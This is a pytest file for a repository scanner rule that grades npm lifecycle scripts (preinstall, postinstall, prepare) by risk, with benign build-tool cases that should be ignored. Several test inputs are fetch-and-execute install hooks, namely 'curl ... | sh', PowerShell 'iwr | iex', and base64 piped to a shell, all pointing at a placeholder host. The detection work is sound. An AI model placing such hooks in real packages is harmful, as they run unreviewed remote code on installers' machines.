import json

from repoguard.scanner import scan_files

RULE_ID = "NPM-LIFECYCLE-SCRIPT"


def pkg(scripts):
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts}, indent=2) + "\n"


def scan_one(content, path="package.json"):
    return [f for f in scan_files([(path, content)]) if f.rule_id == RULE_ID]


def severities(scripts):
    return [f.severity for f in scan_one(pkg(scripts))]


# --- high: downloads / hides / inline code ---------------------------------------------

def test_postinstall_curl_pipe_sh_is_high():
    assert severities({"postinstall": "curl https://example.test/a | sh"}) == ["high"]


def test_download_only_is_high():
    assert severities({"prepare": "wget -O x https://example.test/x"}) == ["high"]


def test_powershell_is_high():
    cmd = 'powershell -NoProfile -Command "iwr https://example.test/a.ps1 | iex"'
    assert severities({"preinstall": cmd}) == ["high"]


def test_inline_node_with_base64_is_high():
    assert severities({"install": "node -e \"eval(atob('AA=='))\""}) == ["high"]


def test_base64_pipe_to_shell_is_high():
    assert severities({"postinstall": "echo AA== | base64 -d | sh"}) == ["high"]


# --- medium: runs a file ---------------------------------------------------------------

def test_node_script_file_is_medium():
    assert severities({"postinstall": "node scripts/setup.js"}) == ["medium"]


def test_bash_script_is_medium():
    assert severities({"prepare": "bash ./setup.sh"}) == ["medium"]


def test_direct_executable_is_medium():
    assert severities({"install": "./run.sh"}) == ["medium"]


def test_chain_takes_the_worst_part():
    assert severities({"prepare": "husky install && node evil.js"}) == ["medium"]


# --- following `npm run` ---------------------------------------------------------------

def test_npm_run_is_followed_to_a_file_runner():
    scripts = {"postinstall": "npm run start", "start": "node server.js"}
    assert severities(scripts) == ["medium"]


def test_npm_run_hiding_a_download_is_high():
    scripts = {"prepare": "npm run setup", "setup": "curl https://example.test/a | sh"}
    assert severities(scripts) == ["high"]


def test_npm_run_cycle_does_not_crash():
    scripts = {"postinstall": "npm run a", "a": "npm run postinstall"}
    assert severities(scripts) == []


# --- low -------------------------------------------------------------------------------

def test_unknown_command_is_low():
    assert severities({"prepare": "rollup -c"}) == ["low"]


# --- benign: must produce nothing ------------------------------------------------------

def test_husky_is_fine():
    assert severities({"prepare": "husky"}) == []
    assert severities({"prepare": "husky install"}) == []


def test_common_build_tools_are_fine():
    assert severities({"postinstall": "patch-package"}) == []
    assert severities({"prepare": "tsc"}) == []
    assert severities({"install": "node-gyp rebuild"}) == []
    assert severities({"prepare": "is-ci || husky install"}) == []
    assert severities({"preinstall": "npx only-allow pnpm"}) == []


def test_npm_run_build_with_tsc_is_fine():
    assert severities({"prepare": "npm run build", "build": "tsc"}) == []


def test_non_lifecycle_scripts_are_ignored():
    assert severities({"start": "node server.js", "test": "node test.js", "build": "tsc"}) == []


# --- line numbers, files, robustness ---------------------------------------------------

def test_finding_points_at_the_script_line():
    content = pkg({"build": "tsc", "postinstall": "node setup.js"})
    expected = next(i for i, ln in enumerate(content.splitlines(), 1) if '"postinstall"' in ln)
    found = scan_one(content)
    assert len(found) == 1
    assert found[0].line == expected
    assert "postinstall" in found[0].snippet


def test_two_lifecycle_scripts_give_two_findings():
    assert len(scan_one(pkg({"preinstall": "node a.js", "postinstall": "node b.js"}))) == 2


def test_works_in_a_subfolder_and_windows_path():
    assert scan_one(pkg({"postinstall": "node a.js"}), path="app/package.json")
    assert scan_one(pkg({"postinstall": "node a.js"}), path="app\\package.json")


def test_other_json_files_are_not_scanned():
    assert not scan_one(pkg({"postinstall": "node a.js"}), path="package-lock.json")


def test_invalid_or_odd_json_does_not_crash():
    assert scan_one("") == []
    assert scan_one("{not json") == []
    assert scan_one("[]") == []
    assert scan_one('{"scripts": "node a.js"}') == []
    assert scan_one('{"scripts": {"postinstall": 5}}') == []


def test_byte_order_mark_is_tolerated():
    assert scan_one("\ufeff" + pkg({"postinstall": "node a.js"}))
